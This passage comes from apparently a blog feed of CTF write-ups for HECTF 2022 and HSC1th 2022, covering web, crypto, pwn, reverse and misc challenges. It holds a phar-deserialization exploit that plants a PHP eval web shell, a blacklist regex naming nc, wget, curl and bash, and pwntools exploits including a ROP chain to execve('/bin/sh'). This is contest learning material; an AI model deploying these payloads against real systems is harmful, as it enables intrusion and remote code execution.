class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>构造png</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-comment">// exec($this-&gt;cmd);</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;awsl.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HeCTF</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>,<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>上传生成的<code>ez.png</code>，触发payload</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-1.png"></p>
<p>访问生成的<code>cmd.php</code>，成功rce</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-2.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><p>在线音符解密得到<code>EA&gt;N?s:WZgTdPYbMSaYg</code></p>
<p>将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/crypto1-1.png"></p>
<h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目没出好，flag直接是明文的放在文件中</p>
<h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>先小指数爆破，得到<code>p</code>和<code>q</code>，通过<code>n/q/p</code>得到<code>t</code>。通过模不互素得到<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boom</span>(<span class="hljs-params">c_,n_,e_</span>):<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span>  gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">0</span>]<br>        i=i+<span class="hljs-number">1</span><br><br>p_= <span class="hljs-number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span><br>q_= <span class="hljs-number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><br>c= <span class="hljs-number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span><br>n= <span class="hljs-number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><br>p=boom(p_,n,<span class="hljs-number">2</span>)<br>q=boom(q_,n,<span class="hljs-number">2</span>)<br>t=n//p//q<br><span class="hljs-keyword">if</span> (t*p*q!=n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    exit(<span class="hljs-number">0</span>)<br>e =<span class="hljs-number">114</span><br><br><br>phi_n= (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><br>t=gmpy2.gcd(e,phi_n)<br>e=e//t<br>d=gmpy2.invert(e,phi_n)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>传入<code>\x00</code>绕过判断</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-1.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;49.234.8.239&#x27;</span>,<span class="hljs-string">&#x27;30531&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<p>输入<code>:!/bin/sh</code>，使得vim中可以执行系统命令</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-2.png"></p>
<h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>传入一个<code>0xFFFFF82</code>即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-2.png"></p>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>栈溢出构造<code>rep</code>链，执行<code>execve(&quot;/bin/sh&quot;)</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-2.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>rdi=<span class="hljs-number">0x00000000004018b2</span><br>rsi=<span class="hljs-number">0x000000000040661e</span><br>rdx=<span class="hljs-number">0x00000000004017bf</span><br>ret=<span class="hljs-number">0x000000000040f408</span><br>syscall=<span class="hljs-number">0x00000000004012e3</span><br>rax=<span class="hljs-number">0x0000000000451aa7</span><br>read=<span class="hljs-number">0x450ff0</span><br><br><span class="hljs-comment">#p=remote()</span><br><span class="hljs-comment">#p=process(&#x27;./static&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>p=remote(<span class="hljs-string">&#x27;121.4.119.164&#x27;</span>,<span class="hljs-string">&#x27;32430&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./static&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span>)<br>payload=flat(<br>        rdi,<span class="hljs-number">0</span>,<br>        rsi,e.bss(<span class="hljs-number">0x100</span>),<br>        rdx,<span class="hljs-number">0x20</span>,<br>        read,<br>        rdi,e.bss(<span class="hljs-number">0x100</span>),<br>        rsi,<span class="hljs-number">0</span>,<br>        rdx,<span class="hljs-number">0</span>,<br>        ret,<br>        rax,<span class="hljs-number">0x3b</span>,<br>        syscall);<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+payload)<br><br>p.interactive()<br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-3.png"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p><em>赛后复现</em></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse5-1.png"></p>
<h2 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h2><p>输入的数据经过某种加密后对每个字节取反，然后与<code>P0w3r</code>的内容比较<br>在<code>Enc0de</code>中看字符集发现是base32加密</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse1-1.png"></p>
<p>将<code>P0w3r</code>变量的内容提取出来后异或<code>0xff</code>，base32解码即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA7</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xAE</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0xff</span>)<br>e+=<span class="hljs-string">&#x27;====&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b32decode(e))<br></code></pre></td></tr></table></figure>




<h2 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h2><p>一个简单的比较，异或<code>0x1F</code>然后加1</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse2-1.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;X[]LZeX&#123;ttqAwqmc&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0x1f</span>)+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>


<h2 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h2><p>观察发现<code>init_S</code>,<code>init_Key</code>,<code>permute_S</code>,<code>create_key_stream</code>这几个函数中用到的数据是固定的，用来生成<code>KeyStream</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse3-1.png"></p>
<p>直接粘贴到编译器运行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> T[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[]=<span class="hljs-string">&quot;thisiskey&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> KeyStream[<span class="hljs-number">32</span>]=&#123;&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">init_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = S;<br>    S[i] = i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">init_Key</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = T;<br>    T[i] = Key[i % <span class="hljs-number">9</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">permute_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    v3 = (S[i] + v3 + (<span class="hljs-type">char</span>)T[i]) % <span class="hljs-number">256</span>;<br>    v1 = S[i];<br>    S[i] = S[v3];<br>    result = S;<br>    S[v3] = v1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">char</span>  <span class="hljs-title function_">create_key_stream</span><span class="hljs-params">(<span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; KeyStream[v5++] = S[(S[v6] + S[i]) % <span class="hljs-number">256</span>] )<br>  &#123;<br>    v2 = a2--;<br>    result = v2 != <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + S[i]) % <span class="hljs-number">256</span>;<br>    v4 = S[i];<br>    S[i] = S[v6];<br>    S[v6] = v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>   init_S();<br>  init_Key();<br>  permute_S();<br>  create_key_stream(<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,KeyStream[i]);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行后得到<code>[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]</code>，这个就是<code>KeyStream</code>的值</p>
<p><code>KeyStream</code>的值与<code>Cry</code>的值异或，得到flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xC3</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x9C</span>,<span class="hljs-number">0xD9</span>,<span class="hljs-number">0x46</span>]<br>b=[<span class="hljs-number">139</span>,<span class="hljs-number">176</span>,<span class="hljs-number">166</span>,<span class="hljs-number">182</span>,<span class="hljs-number">170</span>,<span class="hljs-number">108</span>,<span class="hljs-number">177</span>,<span class="hljs-number">66</span>,<span class="hljs-number">249</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">137</span>,<span class="hljs-number">150</span>,<span class="hljs-number">140</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">86</span>,<span class="hljs-number">253</span>,<span class="hljs-number">212</span>,<span class="hljs-number">116</span>,<span class="hljs-number">98</span>,<span class="hljs-number">236</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">90</span>,<span class="hljs-number">37</span>,<span class="hljs-number">237</span>,<span class="hljs-number">197</span>,<span class="hljs-number">126</span>,<span class="hljs-number">172</span>,<span class="hljs-number">174</span>,<span class="hljs-number">59</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    e+=<span class="hljs-built_in">chr</span>(v^b[i])<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<h2 id="勇士斗恶龙"><a href="#勇士斗恶龙" class="headerlink" title="勇士斗恶龙"></a>勇士斗恶龙</h2><p>在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址<code>38B0</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-1.png"></p>
<p>x64dbg动态调试程序，在主要函数设置断点</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-2.png"></p>
<p>当程序中断时，rcx的值是<code>00000170E3A824B0</code>，储存了两个指针，指向了勇士和恶龙的对象</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-3.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-4.png"></p>
<p><code>0x170e3a828e0+0x20</code>地址处储存了勇士的金币数，将其修改为<code>0xffff</code>,购买高级的装备，将内存地址转移到<code>0x170e3a82950+0x20</code>指向的地址处，输入<code>a</code>攻击恶龙，观察内存数据变化,当恶龙血量为<code>520</code>时得到<code>flag</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-5.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>HECTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HSC1th 2022-wp</title>
    <url>/wp/HSC1th%202022-wp.html</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h2><p><code>flag&#123;HSC_W3LC0M3&#125;</code></p>
<h2 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h2><blockquote>
<p>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？</p>
</blockquote>
<p>压缩包先暴力破解出密码为<code>376852</code></p>
<p>得到一张图片，发现高度不对劲，增加一点高度，看到破损的二维码<br>把定位符补上，扫码得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/flagindoraemon.png"></p>
<h2 id="汝闻-人言否"><a href="#汝闻-人言否" class="headerlink" title="汝闻,人言否"></a>汝闻,人言否</h2><p>看到压缩包的<code>50 4B 01 02</code>，但是没找到头，搜了一下发现头被改成了<code>4B 50</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%9D%E9%97%BB,%E4%BA%BA%E8%A8%80%E5%90%A6-1.png"><br>结尾也有一处<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%9D%E9%97%BB,%E4%BA%BA%E8%A8%80%E5%90%A6-2.png"></p>
<p>提取出来后发现需要密码<br>发现注释<code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code><br>观察发现为键盘密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%9D%E9%97%BB,%E4%BA%BA%E8%A8%80%E5%90%A6-3.png"><br>但是第三个字符有点奇怪，不是字母，最后猜测是最像的A<br>密码：<code>WVALOU</code></p>
<p>解压得到flag，文件头为<code>52 49 46 46</code>，音频文件<br>audacity查看，频谱图中看到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%9D%E9%97%BB,%E4%BA%BA%E8%A8%80%E5%90%A6-4.png"></p>
<h2 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h2><p>银河字母+凹凸字体<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-PERFORMANCE-ART-1.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-PERFORMANCE-ART-2.jpg"></p>
<p>与表对照，不难发现是<code>50 4B</code>即压缩包<br>解压得到<code>ZmxhZ3tnNUEwIWkyZjF9</code><br>base64解码得到flag</p>
